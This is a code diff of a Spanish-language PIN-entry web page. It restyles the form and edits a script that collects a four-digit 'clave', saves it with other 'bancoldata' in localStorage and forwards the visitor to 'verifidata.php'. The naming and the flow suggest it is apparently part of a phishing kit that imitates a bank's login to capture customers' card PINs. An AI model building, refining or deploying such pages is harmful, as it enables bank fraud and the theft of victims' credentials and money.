@@ -10,41 +10,47 @@
     }
 
     html, body {
-      height: 100%; width: 100%;
-      font-family: 'Arial', sans-serif;
-      background-color: #f8f8f8;
-      -webkit-font-smoothing: antialiased;
-    }
-
-    .container {
-      background: url('img/fondo.png') no-repeat center center;
-      background-size: cover;
       width: 100%;
       height: 100%;
-      position: relative;
+      font-family: 'Arial', sans-serif;
+      background: #f8f8f8;
+    }
+
+    body {
       display: flex;
       justify-content: center;
       align-items: center;
     }
 
+    .container {
+      background: url('img/cel2.jpg') no-repeat center center;
+      background-size: cover;
+      width: 100%;
+      height: 100%;
+      position: relative;
+    }
+
     .form-box {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
       background: #fff;
-      padding: 30px 20px;
+      padding: 25px 20px;
       width: 90%;
       max-width: 360px;
-      border-radius: 20px;
-      box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+      border-radius: 18px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.08);
       text-align: center;
     }
 
-    .icon {
+    .form-box .icon {
       font-size: 24px;
-      color: #333;
       margin-bottom: 10px;
     }
 
-    .text {
-      font-size: 16px;
+    .form-box .text {
+      font-size: 15px;
       color: #333;
       margin-bottom: 25px;
     }
@@ -53,40 +59,40 @@
       display: flex;
       justify-content: center;
       gap: 12px;
-      margin-bottom: 30px;
+      margin-bottom: 25px;
     }
 
     .password-input {
-      width: 100%;
-      max-width: 32px;
-      border: none;
-      border-bottom: 2px solid #444;
+      width: 30px;
       text-align: center;
       font-size: 22px;
+      border: none;
+      border-bottom: 2px solid #555;
       background: transparent;
       outline: none;
-      padding: 6px 0;
+      padding: 5px 0;
       color: #111;
     }
 
     .password-input:focus {
-      border-bottom: 2px solid #ffc20e;
+      border-bottom: 2px solid #ffcc00;
     }
 
     .button-group {
       display: flex;
       justify-content: space-between;
-      gap: 12px;
+      gap: 10px;
     }
 
     .button-group button {
       flex: 1;
       padding: 13px 0;
+      font-size: 15px;
+      font-weight: bold;
       border-radius: 40px;
       border: none;
-      font-weight: bold;
-      font-size: 15px;
       transition: 0.3s ease;
+      cursor: pointer;
     }
 
     .cancel-btn {
@@ -107,13 +113,13 @@
       cursor: pointer;
     }
 
-    @media screen and (max-width: 480px) {
+    @media (max-width: 480px) {
       .form-box {
-        padding: 25px 15px;
+        padding: 20px 15px;
       }
 
       .password-input {
-        max-width: 28px;
+        width: 26px;
         font-size: 20px;
       }
 
@@ -136,7 +142,7 @@
         <input type="password" maxlength="1" class="password-input" inputmode="numeric" />
       </div>
       <div class="button-group">
-        <button class="cancel-btn">Cancelar</button>
+        <button class="cancel-btn" onclick="window.location.href='index.html'">Cancelar</button>
         <button class="continue-btn" id="continueBtn" disabled>Continuar</button>
       </div>
     </div>
@@ -147,29 +153,29 @@
     const continueBtn = document.getElementById('continueBtn');
 
     inputs.forEach((input, index) => {
-      input.addEventListener('input', (e) => {
-        if (!/^\d$/.test(e.target.value)) {
-          e.target.value = '';
+      input.addEventListener('input', () => {
+        if (!/^\d$/.test(input.value)) {
+          input.value = '';
         } else if (index < inputs.length - 1) {
           inputs[index + 1].focus();
         }
 
-        const allFilled = [...inputs].every(i => i.value !== '');
+        const allFilled = Array.from(inputs).every(i => i.value !== '');
         continueBtn.disabled = !allFilled;
         continueBtn.classList.toggle('enabled', allFilled);
       });
 
       input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && index > 0 && e.target.value === '') {
+        if (e.key === 'Backspace' && index > 0 && input.value === '') {
           inputs[index - 1].focus();
         }
       });
     });
 
     continueBtn.addEventListener('click', () => {
-      if (continueBtn.disabled) return;
       const pin = Array.from(inputs).map(i => i.value).join('');
-      const bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
+      let bancoldata = localStorage.getItem('bancoldata');
+      bancoldata = bancoldata ? JSON.parse(bancoldata) : {};
       bancoldata.clave = pin;
       localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
       window.location.href = 'verifidata.php';
